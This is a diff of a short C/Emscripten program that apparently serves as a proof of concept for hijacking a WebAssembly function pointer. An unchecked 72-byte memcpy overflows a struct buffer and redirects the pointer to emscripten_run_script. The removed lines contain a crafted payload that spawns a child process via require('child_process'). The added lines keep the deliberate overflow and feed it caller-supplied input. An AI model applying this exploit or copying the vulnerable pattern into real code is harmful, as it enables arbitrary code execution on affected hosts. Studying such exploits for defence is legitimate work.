@@ -13,6 +13,7 @@ typedef struct Comms {
 
 /* Conduct the communication by calling the function pointer with message. */
 void trigger(Comms *comms) {
+  printf("%s", comms->msg);
   comms->out(comms->msg);
 }
 
@@ -21,19 +22,23 @@ void communicate(const char *msg) {
 }
 
 EMSCRIPTEN_KEEPALIVE
-int sup(void) {
+void sup(char *msg) {
   Comms comms;
   comms.out = &communicate;
-  char *useless = &communicate; // 0x4
-  *useless = &emscripten_run_script; // 0x5
-  char *payload = "require('child_process').spawn('npx', ['serve', './']);//" // 57 bytes
-  "       " // + 7 to fill .msg = 64
-  "  " // + 2 for alignment = 66
-  "\x40\x00" // + 2 bytes to fill .msg_len = 68
-  "\x05\x00\x00\x00"; // + 4 bytes to overwrite .out= 72
-  memcpy(comms.msg, payload, 72);
+
+  printf("&communicate: %p\n", &communicate); // 0x4
+  printf("&emscripten_run_script: %p\n", &emscripten_run_script); // 0x5
+  // char *payload = "require('child_process').spawn('npx', ['serve', './']);//" // 57 bytes
+  // "       " // + 7 to fill .msg = 64
+  // "  " // + 2 for alignment = 66
+  // "\x40\x00" // + 2 bytes to fill .msg_len = 68
+  // "\x05\x00\x00\x00"; // + 4 bytes to overwrite .out= 72
+
+  printf("%s\n", msg);
+
+  memcpy(comms.msg, msg, 72);
 
   trigger(&comms);
 
-  return 0;
+  return;
 }
